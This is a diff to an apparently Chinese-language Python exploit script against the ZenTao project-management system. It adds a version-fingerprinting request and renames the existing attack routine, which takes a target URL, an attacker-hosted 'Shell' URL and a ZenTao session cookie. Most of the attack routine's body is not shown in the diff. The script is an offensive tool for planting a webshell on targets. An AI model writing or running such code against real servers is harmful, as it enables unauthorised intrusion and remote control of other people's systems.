@@ -7,6 +7,7 @@ import base64
 import requests
 import random
 import re
+import json
 import sys
 
 def title():
@@ -19,7 +20,20 @@ def title():
     print('+  \033[36mZentaosid   >>> xxxxxxxxxxxxxx(cookie字段)                          \033[0m')
     print('+------------------------------------------')
 
-def POC_1(target_url, shell_url, zentaosid):
+def POC_1(target_url):
+    version_url = target_url + "/www/index.php?mode=getconfig"
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
+    }
+    try:
+        response = requests.get(url=version_url, timeout=20, headers=headers)
+        version = json.loads(response.text)['version']
+        print("\033[32m[o] 禅道版本为:{}\033[0m".format(version))
+
+    except Exception as e:
+        print("\033[31m[x] 获取版本失败 \033[0m", e)
+
+def POC_2(target_url, shell_url, zentaosid):
     options = shell_url.split("://")
     if options[0] == "http":
         shell_url = "HTTP://" + options[1]
@@ -54,4 +68,5 @@ if __name__ == '__main__':
     target_url = str(input("\033[35mPlease input Attack Url\nUrl   >>> \033[0m"))
     shell_url  = str(input("\033[35mShell >>> \033[0m"))
     zentaosid  = str(input("\033[35mZentaosid >>> \033[0m"))
-    POC_1(target_url, shell_url, zentaosid)
+    POC_1(target_url)
+    POC_2(target_url, shell_url, zentaosid)
